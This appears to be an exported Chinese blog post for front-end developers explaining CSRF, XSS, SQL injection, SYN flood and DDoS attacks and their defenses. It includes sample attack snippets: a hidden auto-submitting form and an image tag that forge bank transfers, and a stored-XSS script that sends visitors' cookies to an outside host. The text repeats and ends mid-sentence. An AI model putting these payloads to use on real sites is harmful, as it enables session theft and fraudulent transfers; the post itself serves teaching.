class=\"string\">'money'</span>]);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>然而，危险网站 B 与时俱进，它改了一下代码：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">body</span> <span class=\"attr\">onload</span>=<span class=\"string\">\"steal()\"</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">iframe</span> <span class=\"attr\">name</span>=<span class=\"string\">\"steal\"</span> <span class=\"attr\">display</span>=<span class=\"string\">\"none\"</span>&gt;</span></span><br><span class=\"line\">　　\t<span class=\"tag\">&lt;<span class=\"name\">form</span> <span class=\"attr\">method</span>=<span class=\"string\">\"POST\"</span> <span class=\"attr\">name</span>=<span class=\"string\">\"transfer\"</span>　<span class=\"attr\">action</span>=<span class=\"string\">\"http://www.myBank.com/Transfer.php\"</span>&gt;</span></span><br><span class=\"line\">　　\t\t<span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">\"hidden\"</span> <span class=\"attr\">name</span>=<span class=\"string\">\"toBankId\"</span> <span class=\"attr\">value</span>=<span class=\"string\">\"11\"</span>&gt;</span></span><br><span class=\"line\">　　\t\t<span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">\"hidden\"</span> <span class=\"attr\">name</span>=<span class=\"string\">\"money\"</span> <span class=\"attr\">value</span>=<span class=\"string\">\"1000\"</span>&gt;</span></span><br><span class=\"line\">　　\t<span class=\"tag\">&lt;/<span class=\"name\">form</span>&gt;</span></span><br><span class=\"line\">　　<span class=\"tag\">&lt;/<span class=\"name\">iframe</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>因为这里危险网站B暗地里发送了 POST 请求到银行，通过一个隐藏的自动提交的表单来提交请求，</p>\n<h5 id=\"其实可以看出，CSRF-攻击是源于-WEB-的隐式身份验证机制！WEB-的身份验证机制虽然可以保证一个请求是来自于某个用户的浏览器，但却无法保证该请求是用户批准发送的！\"><a href=\"#其实可以看出，CSRF-攻击是源于-WEB-的隐式身份验证机制！WEB-的身份验证机制虽然可以保证一个请求是来自于某个用户的浏览器，但却无法保证该请求是用户批准发送的！\" class=\"headerlink\" title=\"其实可以看出，CSRF 攻击是源于 WEB 的隐式身份验证机制！WEB 的身份验证机制虽然可以保证一个请求是来自于某个用户的浏览器，但却无法保证该请求是用户批准发送的！\"></a>其实可以看出，CSRF 攻击是源于 WEB 的隐式身份验证机制！WEB 的身份验证机制虽然可以保证一个请求是来自于某个用户的浏览器，但却无法保证该请求是用户批准发送的！</h5><h3 id=\"CSRF-防御\"><a href=\"#CSRF-防御\" class=\"headerlink\" title=\"CSRF 防御\"></a>CSRF 防御</h3><p>CSRF 的防御可以从服务端和客户端两方面着手，防御效果是从服务端着手效果比较好，现在一般的 CSRF 防御也都在服务端进行。</p>\n<ol>\n<li><p>关键操作只接受 POST 请求  </p>\n</li>\n<li><p>验证码：<br>CSRF 攻击的过程，往往是在用户不知情的情况下构造网络请求。所以如果使用验证码，那么每次操作都需要用户进行互动，从而简单有效的防御了 CSRF 攻击。<br>但是如果你在一个网站作出任何举动都要输入验证码会严重影响用户体验，所以验证码一般只出现在特殊操作里面，或者在注册时候使用。</p>\n</li>\n<li><p>检测 Referer：<br>常见的互联网页面与页面之间是存在联系的，比如你在 www.baidu.com 应该是找不到通往 www.google.com 的链接的，再比如你在论坛留言，那么不管你留言后重定向到哪里去了，之前的那个网址一定会包含留言的输入框，这个之前的网址就会保留在新页面头文件的 Referer 中<br>通过检查 Referer 的值，我们就可以判断这个请求是合法的还是非法的，但是问题出在服务器不是任何时候都能接受到 Referer 的值，所以 Referer Check 一般用于监控 CSRF 攻击的发生，而不用来抵御攻击。</p>\n</li>\n<li><p>Token: 目前主流的做法是使用 Token 抵御 CSRF 攻击</p>\n</li>\n</ol>\n<p>CSRF 攻击要成功的条件在于攻击者能够预测所有的参数从而构造出合法的请求。所以根据不可预测性原则，我们可以对参数进行加密从而防止 CSRF 攻击。</p>\n<p>另一个更通用的做法是保持原有参数不变，另外添加一个参数 Token，其值是随机的。这样攻击者因为不知道 Token 而无法构造出合法的请求进行攻击。</p>\n<p>Token 使用原则:</p>\n<ul>\n<li>Token 要足够随机————只有这样才算不可预测</li>\n<li>Token 是一次性的，即每次请求成功后要更新 Token————这样可以增加攻击难度，增加预测难度</li>\n<li>Token 要注意保密性————敏感操作使用 post，防止 Token 出现在 URL 中</li>\n</ul>\n<p><strong>注意：过滤用户输入的内容不能阻挡 csrf，我们需要做的是过滤请求的来源。</strong></p>\n<h2 id=\"XSS攻击\"><a href=\"#XSS攻击\" class=\"headerlink\" title=\"XSS攻击\"></a>XSS攻击</h2><h3 id=\"XSS-概念\"><a href=\"#XSS-概念\" class=\"headerlink\" title=\"XSS 概念\"></a>XSS 概念</h3><p>XSS 又称 CSS，全称 Cross SiteScript，跨站脚本攻击，为了和 CSS 层叠样式表区分所以取名 XSS，是 Web 程序中常见的漏洞。</p>\n<p>其原理是攻击者向有 XS S漏洞的网站中输入(传入)恶意的 HTML 代码，当其它用户浏览该网站时，这段 HTML 代码会自动执行，从而达到攻击的目的。如，盗取用户 Cookie、破坏页面结构、重定向到其它网站等。</p>\n<p>例如：比如某论坛的评论功能没有对 XSS 进行过滤，那么我们可以对其进行评论，评论如下：</p>\n<figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">while(true)&#123;</span><br><span class=\"line\">\talert(“你关不掉我\")；</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>例如发布评论，提交含有 JavaScript 的内容文本。这时服务器端如果没有过滤或转义掉这些脚本，作为内容发布到了页面上，其他用户访问这个页面的时候就会运行这些脚本。</p>\n<p>恶意者可以将上述代码修改成恶意的代码，就可以盗取你的 cookie 或者其它信息。</p>\n<h3 id=\"XSS-攻击类型\"><a href=\"#XSS-攻击类型\" class=\"headerlink\" title=\"XSS 攻击类型\"></a>XSS 攻击类型</h3><h4 id=\"DOM-Based-XSS\"><a href=\"#DOM-Based-XSS\" class=\"headerlink\" title=\"DOM Based XSS\"></a>DOM Based XSS</h4><p>DOM Based XSS 是一种基于网页 DOM 结构的攻击，该攻击特点是中招的人是少数人。</p>\n<p>恶意用户向单独用户发送恶意 JS 代码。</p>\n<h4 id=\"Stored-XSS\"><a href=\"#Stored-XSS\" class=\"headerlink\" title=\"Stored XSS\"></a>Stored XSS</h4><p>Stored XSS 是存储式 XSS 漏洞，由于其攻击代码已经存储到服务器上或者数据库中，所以受害者是很多人。</p>\n<p>example.com 可以发文章，我登录后在 example.com 中发布了一篇文章，文章中包含了恶意代码，<script>window.open(“www.b.com?param=”+document.cookie)</script>，保存文章。这时 Tom 和 Jack 看到了我发布的文章，当在查看我的文章时就都中招了，他们的 cookie 信息都发送到了我的服务器上，攻击成功！这个过程中，受害者是多个人。</p>\n<h3 id=\"防御-XSS-攻击\"><a href=\"#防御-XSS-攻击\" class=\"headerlink\" title=\"防御 XSS 攻击\"></a>防御 XSS 攻击</h3><p>理论上，网站上所有可输入的地方没有对输入数据进行处理的话，都会存在XSS漏洞，漏洞的危害取决于攻击代码的威力，攻击代码也不局限于script。防御 XSS 攻击最简单直接的方法，就是过滤用户的输入。</p>\n<h4 id=\"方法一：\"><a href=\"#方法一：\" class=\"headerlink\" title=\"方法一：\"></a>方法一：</h4><p>如果不需要用户输入 HTML，可以直接对用户的输入进行 HTML escape 。下面一小段脚本：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;script&gt;<span class=\"built_in\">window</span>.location.href=”http:<span class=\"comment\">//www.xss.com”;&lt;/script&gt;</span></span><br></pre></td></tr></table></figure>\n<p>经过 escape 之后就成了：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&amp;lt;script&amp;gt;<span class=\"built_in\">window</span>.location.href=&amp;quot;http:<span class=\"comment\">//www.baidu.com&amp;quot;&amp;lt;/script&amp;gt;</span></span><br></pre></td></tr></table></figure>\n<p>它现在会像普通文本一样显示出来，变得无毒无害，不能执行了。</p>\n<h4 id=\"方法二：完善的过滤体系\"><a href=\"#方法二：完善的过滤体系\" class=\"headerlink\" title=\"方法二：完善的过滤体系\"></a>方法二：完善的过滤体系</h4><p>永远不相信用户的输入。需要对用户的输入进行处理，只允许输入合法的值，其它值一概过滤掉。</p>\n<h4 id=\"方法三：当用户需要输入-HTML-代码\"><a href=\"#方法三：当用户需要输入-HTML-代码\" class=\"headerlink\" title=\"方法三：当用户需要输入 HTML 代码\"></a>方法三：当用户需要输入 HTML 代码</h4><p>当我们需要用户输入 HTML 的时候，需要对用户输入的内容做更加小心细致的处理。</p>\n<p>仅仅粗暴地去掉 script 标签是没有用的，任何一个合法 HTML 标签都可以添加 onclick 一类的事件属性来执行 JavaScript。</p>\n<p>更好的方法可能是，将用户的输入使用 HTML 解析库进行解析，获取其中的数据。然后根据用户原有的标签属性，重新构建 HTML 元素树。构建的过程中，所有的标签、属性都只从白名单中拿取。</p>\n<h2 id=\"SQL-注入\"><a href=\"#SQL-注入\" class=\"headerlink\" title=\"SQL 注入\"></a>SQL 注入</h2><h3 id=\"概念\"><a href=\"#概念\" class=\"headerlink\" title=\"概念\"></a>概念</h3><p>所谓 SQL 注入，就是通过把 SQL 命令插入到 Web 表单提交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的 SQL 命令。</p>\n<p>具体来说，它是利用现有应用程序，将（恶意）的SQL命令注入到后台数据库引擎执行的能力，它可以通过在 Web 表单中输入（恶意）SQL语句得到一个存在安全漏洞的网站上的数据库，而不是按照设计者意图去执行SQL语句。</p>\n<h3 id=\"SQL-防护\"><a href=\"#SQL-防护\" class=\"headerlink\" title=\"SQL 防护\"></a>SQL 防护</h3><ol>\n<li><p>永远不要信任用户的输入:<br>对用户的输入进行校验，可以通过正则表达式，或限制长度；对单引号和<br>双”-“进行转换等。</p>\n</li>\n<li><p>永远不要使用动态拼装 sql，可以使用参数化的 sql 或者直接使用存储过程进行数据查询存取。</p>\n</li>\n<li><p>永远不要使用管理员权限的数据库连接，为每个应用使用单独的权限有限的数据库连接。</p>\n</li>\n<li><p>不要把机密信息直接存放，加密或者 hash 掉密码和敏感的信息。</p>\n</li>\n</ol>\n<h2 id=\"SYN-攻击\"><a href=\"#SYN-攻击\" class=\"headerlink\" title=\"SYN 攻击\"></a>SYN 攻击</h2><h3 id=\"概念-1\"><a href=\"#概念-1\" class=\"headerlink\" title=\"概念\"></a>概念</h3><p>在三次握手过程中，服务器发送 SYN-ACK 之后，收到客户端的 ACK 之前的 TCP 连接称为半连接(half-open connect)。此时服务器处于 SYN_RCVD 状态。当收到 ACK 后，服务器才能转入 ESTABLISHED 状态.</p>\n<p>SYN 攻击指的是，攻击客户端在短时间内伪造大量不存在的 IP 地址，向服务器不断地发送 SYN 包，服务器回复确认包，并等待客户的确认。</p>\n<p>由于源地址是不存在的，服务器需要不断的重发直至超时，这些伪造的 SYN 包将长时间占用未连接队列，正常的 SYN 请求被丢弃，导致目标系统运行缓慢，严重者会引起网络堵塞甚至系统瘫痪。</p>\n<h3 id=\"检测-SYN-攻击\"><a href=\"#检测-SYN-攻击\" class=\"headerlink\" title=\"检测 SYN 攻击\"></a>检测 SYN 攻击</h3><p>检测 SYN 攻击非常的方便，当你在服务器上看到大量的半连接状态时，特别是源 IP 地址是随机的，基本上可以断定这是一次 SYN 攻击。</p>\n<h3 id=\"SYN-攻击防护\"><a href=\"#SYN-攻击防护\" class=\"headerlink\" title=\"SYN 攻击防护\"></a>SYN 攻击防护</h3><ol>\n<li>缩短超时（SYN Timeout）时间</li>\n<li>增加最大半连接数</li>\n<li>过滤网关防护</li>\n</ol>\n<h2 id=\"DDOS攻击\"><a href=\"#DDOS攻击\" class=\"headerlink\" title=\"DDOS攻击\"></a>DDOS攻击</h2><h3 id=\"概念-2\"><a href=\"#概念-2\" class=\"headerlink\" title=\"概念\"></a>概念</h3><p>分布式拒绝服务( DDoS:Distributed Denial of Service )攻击指借助于客户/服务器技术，将多个计算机联合起来作为攻击平台，对一个或多个目标发动DDoS攻击，从而成倍地提高拒绝服务攻击的威力。</p>\n<p>可以打个比方：</p>\n<p>一群恶霸试图让对面那家有着竞争关系的商铺无法正常营业，他们会采取什么手段呢？（只为举例，切勿模仿）</p>\n<p>恶霸们扮作普通客户一直拥挤在对手的商铺，赖着不走，真正的购物者却无法进入；或者总是和营业员有一搭没一搭的东扯西扯，让工作人员不能正常服务客户；也可以为商铺的经营者提供虚假信息，商铺的上上下下忙成一团之后却发现都是一场空，最终跑了真正的大客户，损失惨重。</p>\n<p>此外恶霸们完成这些坏事有时凭单干难以完成，需要叫上很多人一起。嗯，网络安全领域中 DoS 和 DDoS 攻击就遵循着这些思路。</p>\n<p><strong>DDOS 攻击利用目标系统网络服务功能缺陷或者直接消耗其系统资源，使得该目标系统无法提供正常的服务。</strong></p>\n<p>DDoS 攻击通过大量合法的请求占用大量网络资源，以达到瘫痪网络的目的。 具体有几种形式：</p>\n<ol>\n<li>通过使网络过载来干扰甚至阻断正常的网络通讯；</li>\n<li>通过向服务器提交大量请求，使服务器超负荷；</li>\n<li>阻断某一用户访问服务器；</li>\n<li>阻断某服务与特定系统或个人的通讯。</li>\n</ol>\n<p>IP Spoofing:<br>IP欺骗攻击是一种黑客通过向服务端发送虚假的包以欺骗服务器的DDOS攻击示意图DDOS攻击示意图做法。</p>\n<p>具体说，就是将包中的源 IP 地址设置为不存在或不合法的值。服务器一旦接受到该包便会返回接受请求包，但实际上这个包永远返回不到来源处的计算机。这种做法使服务器必需开启自己的监听端口不断等待，也就浪费了系统各方面的资源。 </p>\n<h3 id=\"DDOS-防御\"><a href=\"#DDOS-防御\" class=\"headerlink\" title=\"DDOS 防御\"></a>DDOS 防御</h3><ol>\n<li>关闭不必要的服务</li>\n<li>限制同时打开的 Syn 半连接数目</li>\n<li>缩短Syn半连接的time out 时间</li>\n</ol>\n<p>参考链接：</p>\n<ul>\n<li><a href=\"http://hit-alibaba.github.io/interview/basic/network/TCP.html\" target=\"_blank\" rel=\"external\">TCP 协议 笔试面试知识整理</a></li>\n<li><a href=\"http://www.cnblogs.com/hyddd/archive/2009/04/09/1432744.html\" target=\"_blank\" rel=\"external\">浅谈CSRF攻击方式 - hyddd - 博客园</a></li>\n<li><a href=\"http://baike.baidu.com/link?url=REctw71a-zdfpceJUYOVJRdapLLC7zz321lNEjpl_EMD4LW5D7X4_9vXYfUj_qqbWhfPj-CI0zWC4nlkbQZCIrG8GFYSbPJjSA1-NxwKBL8DUr2m5HU86iLB4AbEdhNJsWl7HqFt85b4pTDCQXPjzK\" target=\"_blank\" rel=\"external\">分布式拒绝服务攻击 百度百科</a></li>\n<li><a href=\"http://baike.baidu.com/view/3896.htm\" target=\"_blank\" rel=\"external\">sql注入 百度百科</a></li>\n</ul>\n","excerpt":"","more":"<p>作为一个前端 er，掌握必要的网络安全知识是必要的，下面我整理了几种常见的网络攻击方式及防御技巧，本文内容来自网络，仅供参考。</p>\n<h2 id=\"CSRF-攻击\"><a href=\"#CSRF-攻击\" class=\"headerlink\" title=\"CSRF 攻击\"></a>CSRF 攻击</h2><h3 id=\"CSRF-概念\"><a href=\"#CSRF-概念\" class=\"headerlink\" title=\"CSRF 概念\"></a>CSRF 概念</h3><p>CSRF（Cross-site request forgery），中文名称：跨站请求伪造，也被称为：one click attack/session riding，缩写为：CSRF/XSRF。</p>\n<p>CSRF 可以简单理解为：<strong>攻击者盗用了你的身份，以你的名义发送恶意请求</strong>，容易造成个人隐私泄露以及财产安全。</p>\n<h3 id=\"CSRF-原理\"><a href=\"#CSRF-原理\" class=\"headerlink\" title=\"CSRF 原理\"></a>CSRF 原理</h3><p><img src=\"/assets/2016-03-09-web-security/1.jpg\" alt=\"\"></p>\n<p>要完成一次 CSRF 攻击，受害者必须完成：</p>\n<ol>\n<li>登录受信任网站 A，并在本地生成 Cookie。</li>\n<li>在不登出A的情况下，访问危险网站 B。</li>\n</ol>\n<p>案例：</p>\n<p>场景1. 银行网站 A，它以 GET<br>请求来完成银行转账的操作，如：<a href=\"http://www.mybank.com/Transfer.php?toBankId=11&amp;money=1000\">http://www.mybank.com/Transfer.php?toBankId=11&amp;money=1000</a></p>\n<p>危险网站B，它里面有一段 HTML 的代码如下:</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">img</span> <span class=\"attr\">src</span>=<span class=\"string\">http:</span>//<span class=\"attr\">www.mybank.com</span>/<span class=\"attr\">Transfer.php</span>?<span class=\"attr\">toBankId</span>=<span class=\"string\">11&amp;money=1000</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>首先，你登录了银行网站 A，然后访问危险网站 B，噢，这时你会发现你的银行账户少了 1000 块…  </p>\n<p>原因是银行网站 A 违反了 HTTP 规范，使用 GET 请求更新资源。  </p>\n<p>在访问危险网站B的之前，你已经登录了银行网站 A，而 B 中的 <img> 以 GET 的方式请求第三方资源（这里的第三方就是指银行网站了，原本这是一个合法的请求，但这里被不法分子利用了），所以你的浏览器会带上你的银行网站 A 的 Cookie 发出 Get 请求，去获取资源 “<a href=\"http://www.mybank.com/Transfer.php?toBankId=11&amp;money=1000”，结果银行网站服务器收到请求后，认为这是一个更新资源操作（转账操作），所以就立刻进行转账操作\">http://www.mybank.com/Transfer.php?toBankId=11&amp;money=1000”，结果银行网站服务器收到请求后，认为这是一个更新资源操作（转账操作），所以就立刻进行转账操作</a>……</p>\n<p>情况2:  </p>\n<p>银行决定把获取请求数据的方法也改了，改用 $_POST，只获取 POST 请求的数据，后台处理页面 Transfer.php 代码如下：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">\tsession_start();</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>($_POST[<span class=\"string\">'toBankId'</span>] &amp;&amp;<span class=\"keyword\">isset</span>($_POST[<span class=\"string\">'money'</span>]))</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tbuy_stocks($_POST[<span class=\"string\">'toBankId'</span>],　$_POST[<span class=\"string\">'money'</span>]);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>然而，危险网站 B 与时俱进，它改了一下代码：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">body</span> <span class=\"attr\">onload</span>=<span class=\"string\">\"steal()\"</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">iframe</span> <span class=\"attr\">name</span>=<span class=\"string\">\"steal\"</span> <span class=\"attr\">display</span>=<span class=\"string\">\"none\"</span>&gt;</span></span><br><span class=\"line\">　　\t<span class=\"tag\">&lt;<span class=\"name\">form</span> <span class=\"attr\">method</span>=<span class=\"string\">\"POST\"</span> <span class=\"attr\">name</span>=<span class=\"string\">\"transfer\"</span>　<span class=\"attr\">action</span>=<span class=\"string\">\"http://www.myBank.com/Transfer.php\"</span>&gt;</span></span><br><span class=\"line\">　　\t\t<span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">\"hidden\"</span> <span class=\"attr\">name</span>=<span class=\"string\">\"toBankId\"</span> <span class=\"attr\">value</span>=<span class=\"string\">\"11\"</span>&gt;</span></span><br><span class=\"line\">　　\t\t<span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">\"hidden\"</span> <span class=\"attr\">name</span>=<span class=\"string\">\"money\"</span> <span class=\"attr\">value</span>=<span class=\"string\">\"1000\"</span>&gt;</span></span><br><span class=\"line\">　　\t<span class=\"tag\">&lt;/<span class=\"name\">form</span>&gt;</span></span><br><span class=\"line\">　　<span class=\"tag\">&lt;/<span class=\"name\">iframe</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>因为这里危险网站B暗地里发送了 POST 请求到银行，通过一个隐藏的自动提交的表单来提交请求，</p>\n<h5 id=\"其实可以看出，CSRF-攻击是源于-WEB-的隐式身份验证机制！WEB-的身份验证机制虽然可以保证一个请求是来自于某个用户的浏览器，但却无法保证该请求是用户批准发送的！\"><a href=\"#其实可以看出，CSRF-攻击是源于-WEB-的隐式身份验证机制！WEB-的身份验证机制虽然可以保证一个请求是来自于某个用户的浏览器，但却无法保证该请求是用户批准发送的！\" class=\"headerlink\" title=\"其实可以看出，CSRF 攻击是源于 WEB 的隐式身份验证机制！WEB 的身份验证机制虽然可以保证一个请求是来自于某个用户的浏览器，但却无法保证该请求是用户批准发送的！\"></a>其实可以看出，CSRF 攻击是源于 WEB 的隐式身份验证机制！WEB 的身份验证机制虽然可以保证一个请求是来自于某个用户的浏览器，但却无法保证该请求是用户批准发送的！</h5><h3 id=\"CSRF-防御\"><a href=\"#CSRF-防御\" class=\"headerlink\" title=\"CSRF 防御\"></a>CSRF 防御</h3><p>CSRF 的防御可以从服务端和客户端两方面着手，防御效果是从服务端着手效果比较好，现在一般的 CSRF 防御也都在服务端进行。</p>\n<ol>\n<li><p>关键操作只接受 POST 请求  </p>\n</li>\n<li><p>验证码：<br>CSRF 攻击的过程，往往是在用户不知情的情况下构造网络请求。所以如果使用验证码，那么每次操作都需要用户进行互动，从而简单有效的防御了 CSRF 攻击。<br>但是如果你在一个网站作出任何举动都要输入验证码会严重影响用户体验，所以验证码一般只出现在特殊操作里面，或者在注册时候使用。</p>\n</li>\n<li><p>检测 Referer：<br>常见的互联网页面与页面之间是存在联系的，比如你在 www.baidu.com 应该是找不到通往 www.google.com 的链接的，再比如你在论坛留言，那么不管你留言后重定向到哪里去了，之前的那个网址一定会包含留言的输入框，这个之前的网址就会保留在新页面头文件的 Referer 中<br>通过检查 Referer 的值，我们就可以判断这个请求是合法的还是非法的，但是问题出在服务器不是任何时候都能接受到 Referer 的值，所以 Referer Check 一般用于监控 CSRF 攻击的发生，而不用来抵御攻击。</p>\n</li>\n<li><p>Token: 目前主流的做法是使用 Token 抵御 CSRF 攻击</p>\n</li>\n</ol>\n<p>CSRF 攻击要成功的条件在于攻击者能够预测所有的参数从而构造出合法的请求。所以根据不可预测性原则，我们可以对参数进行加密从而防止 CSRF 攻击。</p>\n<p>另一个更通用的做法是保持原有参数不变，另外添加一个参数 Token，其值是随机的。这样攻击者因为不知道 Token 而无法构造出合法的请求进行攻击。</p>\n<p>Token 使用原则:</p>\n<ul>\n<li>Token 要足够随机————只有这样才算不可预测</li>\n<li>Token 是一次性的，即每次请求成功后要更新 Token————这样可以增加攻击难度，增加预测难度</li>\n<li>Token 要注意保密性————敏感操作使用 post，防止 Token 出现在 URL 中</li>\n</ul>\n<p><strong>注意：过滤用户输入的内容不能阻挡 csrf，我们需要做的是过滤请求的来源。</strong></p>\n<h2 id=\"XSS攻击\"><a href=\"#XSS攻击\" class=\"headerlink\" title=\"XSS攻击\"></a>XSS攻击</h2><h3 id=\"XSS-概念\"><a href=\"#XSS-概念\" class=\"headerlink\" title=\"XSS 概念\"></a>XSS 概念</h3><p>XSS 又称 CSS，全称 Cross SiteScript，跨站脚本攻击，为了和 CSS 层叠样式表区分所以取名 XSS，是 Web 程序中常见的漏洞。</p>\n<p>其原理是攻击者向有 XS S漏洞的网站中输入(传入)恶意的 HTML 代码，当其它用户浏览该网站时，这段 HTML 代码会自动执行，从而达到攻击的目的。如，盗取用户 Cookie、破坏页面结构、重定向到其它网站等。</p>\n<p>例如：比如某论坛的评论功能没有对 XSS 进行过滤，那么我们可以对其进行评论，评论如下：</p>\n<figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">while(true)&#123;</span><br><span class=\"line\">\talert(“你关不掉我\")；</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>例如发布评论，提交含有 JavaScript 的内容文本。这时服务器端如果没有过滤或转义掉这些脚本，作为内容发布到了页面上，其他用户访问这个页面的时候就会运行这些脚本。</p>\n<p>恶意者可以将上述代码修改成恶意的代码，就可以盗取你的 cookie 或者其它信息。</p>\n<h3 id=\"XSS-攻击类型\"><a href=\"#XSS-攻击类型\" class=\"headerlink\" title=\"XSS 攻击类型\"></a>XSS 攻击类型</h3><h4 id=\"DOM-Based-XSS\"><a href=\"#DOM-Based-XSS\" class=\"headerlink\" title=\"DOM Based XSS\"></a>DOM Based XSS</h4><p>DOM Based XSS 是一种基于网页 DOM 结构的攻击，该攻击特点是中招的人是少数人。</p>\n<p>恶意用户向单独用户发送恶意 JS 代码。</p>\n<h4 id=\"Stored-XSS\"><a href=\"#Stored-XSS\" class=\"headerlink\" title=\"Stored XSS\"></a>Stored XSS</h4><p>Stored XSS 是存储式 XSS 漏洞，由于其攻击代码已经存储到服务器上或者数据库中，所以受害者是很多人。</p>\n<p>example.com 可以发文章，我登录后在 example.com 中发布了一篇文章，文章中包含了恶意代码，<script>window.open(“www.b.com?param=”+document.cookie)</script>，保存文章。这时 Tom 和 Jack 看到了我发布的文章，当在查看我的文章时就都中招了，他们的 cookie 信息都发送到了我的服务器上，攻击成功！这个过程中，受害者是多个人。</p>\n<h3 id=\"防御-XSS-攻击\"><a href=\"#防御-XSS-攻击\" class=\"headerlink\" title=\"防御 XSS 攻击\"></a>防御 XSS 攻击</h3><p>理论上，网站上所有可输入的地方没有对输入数据进行处理的话，都会存在XSS漏洞，漏洞的危害取决于攻击代码的威力，攻击代码也不局限于script。防御 XSS 攻击最简单直接的方法，就是过滤用户的输入。</p>\n<h4 id=\"方法一：\"><a href=\"#方法一：\" class=\"headerlink\" title=\"方法一：\"></a>方法一：</h4><p>如果不需要用户输入 HTML，可以直接对用户的输入进行 HTML escape 。下面一小段脚本：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;script&gt;<span class=\"built_in\">window</span>.location.href=”http:<span class=\"comment\">//www.xss.com”;&lt;/script&gt;</span></span><br></pre></td></tr></table></figure>\n<p>经过 escape 之后就成了：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&amp;lt;script&amp;gt;<span class=\"built_in\">window</span>.location.href=&amp;quot;http:<span class=\"comment\">//www.baidu.com&amp;quot;&amp;lt;/script&amp;gt;</span></span><br></pre></td></tr></table></figure>\n<p>它现在会像普通文本一样显示出来，变得无毒无害，不能执行了。</p>\n<h4 id=\"方法二：完善的过滤体系\"><a href=\"#方法二：完善的过滤体系\" class=\"headerlink\" title=\"方法二：完善的过滤体系\"></a>方法二：完善的过滤体系</h4><p>永远不相信用户的输入。需要对用户的输入进行处理，只允许输入合法的值，其它值一概过滤掉。</p>\n<h4 id=\"方法三：当用户需要输入-HTML-代码\"><a href=\"#方法三：当用户需要输入-HTML-代码\" class=\"headerlink\" title=\"方法三：当用户需要输入 HTML 代码\"></a>方法三：当用户需要输入 HTML 代码</h4><p>当我们需要用户输入 HTML 的时候，需要对用户输入的内容做更加小心细致的处理。</p>\n<p>仅仅粗暴地去掉 script 标签是没有用的，任何一个合法 HTML 标签都可以添加 onclick 一类的事件属性来执行 JavaScript。</p>\n<p>更好的方法可能是，将用户的输入使用 HTML 解析库进行解析，获取其中的数据。然后根据用户原有的标签属性，重新构建 HTML 元素树。构建的过程中，所有的标签、属性都只从白名单中拿取。</p>\n<h2 id=\"SQL-注入\"><a href=\"#SQL-注入\" class=\"headerlink\" title=\"SQL 注入\"></a>SQL 注入</h2><h3 id=\"概念\"><a href=\"#概念\" class=\"headerlink\" title=\"概念\"></a>概念</h3><p>所谓 SQL 注入，就是通过把 SQL 命令插入到 Web 表单提交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的 SQL 命令。</p>\n<p>具体来说，它是利用现有应用程序，将（恶意）的SQL命令注入到后台数据库引擎执行的能力，它可以通过在 Web 